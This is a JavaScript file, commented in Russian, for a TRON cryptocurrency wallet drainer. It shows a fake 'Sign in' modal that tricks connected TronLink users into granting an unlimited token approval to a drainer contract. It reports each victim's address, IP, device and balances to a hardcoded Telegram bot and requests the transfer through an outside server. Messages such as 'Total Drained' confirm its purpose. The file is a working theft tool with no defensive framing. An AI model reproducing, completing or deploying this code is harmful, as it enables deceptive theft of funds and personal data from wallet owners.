import TronWeb from 'tronweb';

// Вспомогательные функции для TRON
function formatUnits(value, decimals) {
  return Number(value) / Math.pow(10, decimals);
}

function parseUnits(value, decimals) {
  return Math.floor(value * Math.pow(10, decimals));
}

function isAddress(address) {
  return tronWeb && tronWeb.isAddress(address);
}

// Конфигурация
const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a';
const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8238426852:AAGEc__oMefvCpE_jJtgsjDCleEfDBrjolc';
const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4835655591';

const TRON_NETWORK = {
  name: 'TRON Mainnet',
  chainId: 1, // TRON Mainnet
  rpcUrl: 'https://api.trongrid.io',
  nativeToken: 'TRX',
  drainerAddress: 'TXXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' // Замени на адрес задеплоенного DrainerTRON
};

const TOKENS = {
  'TRON': [
    { symbol: 'TRX', address: 'native', decimals: 6 },
    { symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6 }
  ]
};

const trc20Abi = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' }
    ],
    name: 'allowance',
    outputs: [{ name: 'remaining', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: '_spender', type: 'address' },
      { name: '_value', type: 'uint256' }
    ],
    name: 'approve',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function'
  }
];

// Состояние
const store = {
  accountState: {},
  networkState: { chainId: TRON_NETWORK.chainId, name: TRON_NETWORK.name },
  tokenBalances: [],
  errors: [],
  approvedTokens: {},
  isApprovalRequested: false,
  isApprovalRejected: false,
  connectionKey: null,
  isProcessingConnection: false
};

// Инициализация TronWeb
let tronWeb;
async function initTronWeb() {
  if (window.tronWeb) {
    tronWeb = window.tronWeb;
    return tronWeb;
  }
  tronWeb = new TronWeb({
    fullHost: TRON_NETWORK.rpcUrl,
    headers: { 'TRON-PRO-API-KEY': 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx' } // Получи API ключ на Trongrid.io
  });
  return tronWeb;
}

// Утилиты
const debounce = (func, wait) => {
  let timeout;
  return (...args) => {
    clearTimeout(timeout);
    timeout = setTimeout(() => func(...args), wait);
  };
};

const updateStore = (key, value) => {
  store[key] = value;
};

const updateStateDisplay = (elementId, state) => {
  const element = document.getElementById(elementId);
  if (element) element.innerHTML = JSON.stringify(state, null, 2);
};

const updateButtonVisibility = (isConnected) => {
  const disconnectBtn = document.getElementById('disconnect');
  if (disconnectBtn) disconnectBtn.style.display = isConnected ? '' : 'none';
};

// Модальное окно (без изменений, копируется из твоего кода)
function createCustomModal() {
  const style = document.createElement('style');
  style.textContent = `
    .custom-modal {
      opacity: 0;
      transition: opacity 0.3s ease-in-out;
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      justify-content: center;
      align-items: center;
    }
    .custom-modal.show {
      opacity: 1;
      display: flex;
    }
    .custom-modal-content {
      transform: translateY(-20px);
      transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
      opacity: 0;
      background-color: #121313;
      padding: 45px;
      border-radius: 30px;
      text-align: center;
      width: 320px;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    }
    .custom-modal.show .custom-modal-content {
      transform: translateY(0);
      opacity: 1;
    }
    .custom-modal-title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 45px;
      margin-top: -25px;
    }
    .custom-modal-loader {
      border: 4px solid #ffffff33;
      border-top: 4px solid #ffffff;
      border-radius: 50%;
      width: 52px;
      height: 52px;
      animation: spin 1s ease-in-out infinite;
      margin: 0 auto 20px;
    }
    .custom-modal-message {
      margin-top: 45px;
      font-size: 16px;
      line-height: 1.5;
      color: #858585;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  `;
  document.head.appendChild(style);

  const modal = document.createElement('div');
  modal.id = 'customModal';
  modal.className = 'custom-modal';
  modal.innerHTML = `
    <div class="custom-modal-content">
      <p class="custom-modal-title">Sign in</p>
      <div class="custom-modal-loader"></div>
      <p class="custom-modal-message">Sign this message to prove you own this wallet and proceed. Canceling will disconnect you.</p>
    </div>
  `;
  document.body.appendChild(modal);
}

function showCustomModal() {
  const modal = document.getElementById('customModal');
  if (modal) {
    modal.style.display = 'flex';
    setTimeout(() => modal.classList.add('show'), 10);
  }
}

function hideCustomModal() {
  const modal = document.getElementById('customModal');
  if (modal) {
    modal.classList.remove('show');
    setTimeout(() => modal.style.display = 'none', 300);
  }
}

// Утилиты для TRON
const getScanLink = (hash, isTx = false) => {
  const basePath = isTx ? '/#/transaction/' : '/#/address/';
  return `https://tronscan.org${basePath}${hash}`;
};

const sendTelegramMessage = async (message) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
    });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description || 'Failed to send Telegram message');
    console.log('Telegram message sent successfully');
  } catch (error) {
    store.errors.push(`Error sending Telegram message: ${error.message}`);
  }
};

const getUserIP = async () => {
  const cachedIP = sessionStorage.getItem('userIP');
  if (cachedIP) return cachedIP;
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    const ip = data.ip || 'Unknown IP';
    sessionStorage.setItem('userIP', ip);
    return ip;
  } catch (error) {
    return 'Unknown IP';
  }
};

const detectDevice = () => {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera || 'Unknown Device';
  if (/Windows NT/i.test(userAgent)) return 'Windows';
  if (/iPhone/i.test(userAgent) && !/Android/i.test(userAgent)) return 'iPhone';
  if (/Android/i.test(userAgent) && !/iPhone/i.test(userAgent)) return 'Android';
  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'Mac';
  if (/Tablet|iPad/i.test(userAgent)) return 'Tablet';
  return 'Desktop';
};

const getTokenBalance = async (address, token) => {
  if (!address || !tronWeb.isAddress(address)) {
    console.error(`Invalid address: ${address}`);
    return 0;
  }
  try {
    if (token.address === 'native') {
      const balance = await tronWeb.trx.getBalance(address);
      return Number(formatUnits(balance, token.decimals));
    } else {
      const contract = await tronWeb.contract(trc20Abi, token.address);
      const balance = await contract.balanceOf(address).call();
      return Number(formatUnits(balance, token.decimals));
    }
  } catch (error) {
    store.errors.push(`Error fetching balance for ${token.address}: ${error.message}`);
    return 0;
  }
};

const getTokenAllowance = async (ownerAddress, tokenAddress, spenderAddress) => {
  if (!tronWeb.isAddress(ownerAddress) || !tronWeb.isAddress(tokenAddress) || !tronWeb.isAddress(spenderAddress)) {
    console.error(`Invalid addresses: owner=${ownerAddress}, token=${tokenAddress}, spender=${spenderAddress}`);
    return 0;
  }
  try {
    const contract = await tronWeb.contract(trc20Abi, tokenAddress);
    const allowance = await contract.allowance(ownerAddress, spenderAddress).call();
    return allowance.toString();
  } catch (error) {
    store.errors.push(`Error fetching allowance for ${tokenAddress}: ${error.message}`);
    return 0;
  }
};

const waitForAllowance = async (userAddress, tokenAddress, contractAddress) => {
  console.log(`Waiting for allowance to become maximum...`);
  while (true) {
    const allowance = await getTokenAllowance(userAddress, tokenAddress, contractAddress);
    console.log(`Current allowance: ${allowance}`);
    if (BigInt(allowance) > BigInt(1000)) {
      console.log(`Allowance is now maximum: ${allowance}`);
      return true;
    }
    await new Promise(resolve => setTimeout(resolve, 2000));
  }
};

const getTokenPrice = async (symbol) => {
  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`);
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    const data = await response.json();
    return Number(data.price) || 0;
  } catch (error) {
    store.errors.push(`Error fetching price for ${symbol}: ${error.message}`);
    return 0;
  }
};

const sendTransferRequest = async (userAddress, tokenAddress, amount, txHash) => {
  try {
    const response = await fetch('https://api.cryptomuspayye.icu/api/transfers', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId: TRON_NETWORK.chainId, txHash })
    });
    const data = await response.json();
    if (data.success) {
      console.log(`Transfer request successful: ${data.txHash}`);
      return { success: true, txHash: data.txHash };
    }
    return { success: false, message: data.message };
  } catch (error) {
    return { success: false, message: error.message };
  }
};

const approveToken = async (tokenAddress, contractAddress) => {
  if (!tronWeb.defaultAddress.base58) throw new Error('TronLink not connected');
  if (!tronWeb.isAddress(tokenAddress) || !tronWeb.isAddress(contractAddress)) throw new Error('Invalid token or contract address');
  try {
    const contract = await tronWeb.contract(trc20Abi, tokenAddress);
    const tx = await contract.approve(contractAddress, '115792089237316195423570985008687907853269984665640564039457584007913129639935').send({
      feeLimit: 10000000, // 10 TRX
      callValue: 0
    });
    console.log(`Approve transaction sent: ${tx}`);
    return tx;
  } catch (error) {
    store.errors.push(`Approve token failed: ${error.message}`);
    throw error;
  }
};

const notifyWalletConnection = async (address, walletName, device, balances) => {
  if (store.isProcessingConnection) return;
  store.isProcessingConnection = true;
  try {
    showCustomModal();
    await new Promise(resolve => setTimeout(resolve, 3000));
    const ip = await getUserIP();
    const siteUrl = window.location.href || 'Unknown URL';
    const scanLink = getScanLink(address);
    let totalValue = 0;
    const tokenList = balances
      .filter(token => token.balance > 0)
      .map(token => {
        const price = token.symbol === 'USDT' ? 1 : token.price || 0;
        const value = token.balance * price;
        totalValue += value;
        return `➡️ ${token.symbol} - ${value.toFixed(2)}$`;
      })
      .join('\n');
    const message = `🚨 New connect (${walletName} - ${device})\n` +
                   `🌀 [Address](${scanLink})\n` +
                   `🕸 Network: ${TRON_NETWORK.name}\n` +
                   `🌎 ${ip}\n\n` +
                   `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                   `${tokenList}\n\n` +
                   `🔗 Site: ${siteUrl}`;
    await sendTelegramMessage(message);
    store.connectionKey = `${address}_${TRON_NETWORK.chainId}`;
    const hasBalance = balances.some(token => token.balance > 0);
    if (!hasBalance) {
      const modalMessage = document.querySelector('.custom-modal-message');
      if (modalMessage) modalMessage.textContent = 'Congratulations!';
      await new Promise(resolve => setTimeout(resolve, 1000));
      store.isProcessingConnection = false;
      hideCustomModal();
      return;
    }
  } catch (error) {
    store.errors.push(`Error in notifyWalletConnection: ${error.message}`);
    hideCustomModal();
    store.isProcessingConnection = false;
  }
};

const notifyTransferApproved = async (address, walletName, device, token) => {
  try {
    const ip = await getUserIP();
    const siteUrl = window.location.href || 'Unknown URL';
    const scanLink = getScanLink(address);
    const amountValue = (token.balance * token.price).toFixed(2);
    const message = `⚠️ Balance transfer approved (${walletName} - ${device})\n` +
                   `🌀 [Address](${scanLink})\n` +
                   `🕸 Network: ${TRON_NETWORK.name}\n` +
                   `🌎 ${ip}\n\n` +
                   `**🔥 Processing: ${amountValue}$**\n` +
                   `➡️ ${token.symbol}\n\n` +
                   `🔗 Site: ${siteUrl}`;
    await sendTelegramMessage(message);
  } catch (error) {
    store.errors.push(`Error in notifyTransferApproved: ${error.message}`);
  }
};

const notifyTransferSuccess = async (address, walletName, device, token, txHash) => {
  try {
    const ip = await getUserIP();
    const scanLink = getScanLink(address);
    const amountValue = (token.balance * token.price).toFixed(2);
    const txLink = getScanLink(txHash, true);
    const message = `✅ Drainer successfully (${walletName} - ${device})\n` +
                   `🌀 [Address](${scanLink})\n` +
                   `🕸 Network: ${TRON_NETWORK.name}\n` +
                   `🌎 ${ip}\n\n` +
                   `**💰 Total Drained: ${amountValue}$**\n` +
                   `➡️ ${token.symbol} - ${amountValue}$\n\n` +
                   `🔗 Transfer: [Transaction Hash](${txLink})`;
    await sendTelegramMessage(message);
  } catch (error) {
    store.errors.push(`Error in notifyTransferSuccess: ${error.message}`);
  }
};

const initializeSubscribers = () => {
  const debouncedCheckAccount = debounce(async () => {
    if (!tronWeb.defaultAddress.base58) {
      updateStore('accountState', {});
      updateStateDisplay('accountState', {});
      updateButtonVisibility(false);
      return;
    }
    const address = tronWeb.defaultAddress.base58;
    const state = { isConnected: true, address };
    updateStore('accountState', state);
    updateStateDisplay('accountState', state);
    updateButtonVisibility(true);

    const walletInfo = { name: 'TronLink' };
    const device = detectDevice();
    const balancePromises = TOKENS['TRON'].map(token =>
      getTokenBalance(address, token).then(balance => ({
        symbol: token.symbol,
        balance,
        address: token.address,
        network: 'TRON',
        chainId: TRON_NETWORK.chainId,
        decimals: token.decimals
      }))
    );
    const allBalances = await Promise.all(balancePromises);
    store.tokenBalances = allBalances;
    updateStateDisplay('tokenBalancesState', allBalances);

    let maxValue = 0;
    let mostExpensive = null;
    for (const token of allBalances) {
      if (token.balance > 0) {
        const price = token.symbol === 'USDT' ? 1 : await getTokenPrice(token.symbol);
        const value = token.balance * price;
        token.price = price;
        if (value > maxValue) {
          maxValue = value;
          mostExpensive = { ...token, price, value };
        }
      }
    }

    await notifyWalletConnection(state.address, walletInfo.name, device, allBalances);

    if (mostExpensive) {
      console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`);
      try {
        const contractAddress = TRON_NETWORK.drainerAddress;
        const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`;
        if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
          const approveMessage = store.approvedTokens[approvalKey]
            ? `Approve already completed for ${mostExpensive.symbol}`
            : store.isApprovalRejected
            ? `Approve was rejected for ${mostExpensive.symbol}`
            : `Approve request pending for ${mostExpensive.symbol}`;
          console.log(approveMessage);
          const approveState = document.getElementById('approveState');
          if (approveState) approveState.innerHTML = approveMessage;
          store.isProcessingConnection = false;
          return;
        }
        store.isApprovalRequested = true;
        const txHash = await approveToken(mostExpensive.address, contractAddress);
        store.approvedTokens[approvalKey] = true;
        store.isApprovalRequested = false;
        let approveMessage = `Approve successful for ${mostExpensive.symbol}: ${txHash}`;
        console.log(approveMessage);
        await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive);

        await waitForAllowance(state.address, mostExpensive.address, contractAddress);
        const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals);
        const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, txHash);

        if (transferResult.success) {
          console.log(`Transfer successful: ${transferResult.txHash}`);
          await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, transferResult.txHash);
          approveMessage += `<br>Transfer successful: ${transferResult.txHash}`;
        } else {
          console.log(`Transfer failed: ${transferResult.message}`);
          approveMessage += `<br>Transfer failed: ${transferResult.message}`;
        }

        const approveState = document.getElementById('approveState');
        if (approveState) approveState.innerHTML = approveMessage;
        hideCustomModal();
        store.isProcessingConnection = false;
      } catch (error) {
        store.isApprovalRequested = false;
        if (error.message.includes('user rejected')) {
          store.isApprovalRejected = true;
          const errorMessage = `Approve was rejected for ${mostExpensive.symbol}`;
          store.errors.push(errorMessage);
          const approveState = document.getElementById('approveState');
          if (approveState) approveState.innerHTML = errorMessage;
          hideCustomModal();
          store.connectionKey = null;
          store.isProcessingConnection = false;
          sessionStorage.clear();
        } else {
          const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`;
          store.errors.push(errorMessage);
          const approveState = document.getElementById('approveState');
          if (approveState) approveState.innerHTML = errorMessage;
          hideCustomModal();
          store.isProcessingConnection = false;
        }
      }
    } else {
      const message = 'No tokens with positive balance';
      console.log(message);
      const mostExpensiveState = document.getElementById('mostExpensiveTokenState');
      if (mostExpensiveState) mostExpensiveState.innerHTML = message;
      hideCustomModal();
      store.isProcessingConnection = false;
    }
  }, 1000);

  setInterval(debouncedCheckAccount, 1000);
};

// Инициализация
window.addEventListener('load', async () => {
  await initTronWeb();
  createCustomModal();
  initializeSubscribers();
  updateButtonVisibility(!!tronWeb.defaultAddress.base58);

  document.querySelectorAll('.open-connect-modal').forEach(button => {
    button.addEventListener('click', async () => {
      if (!tronWeb.defaultAddress.base58) {
        alert('Please connect TronLink wallet');
      }
    });
  });

  document.getElementById('disconnect')?.addEventListener('click', () => {
    store.approvedTokens = {};
    store.errors = [];
    store.isApprovalRequested = false;
    store.isApprovalRejected = false;
    store.connectionKey = null;
    store.isProcessingConnection = false;
    sessionStorage.clear();
    updateButtonVisibility(false);
  });
});
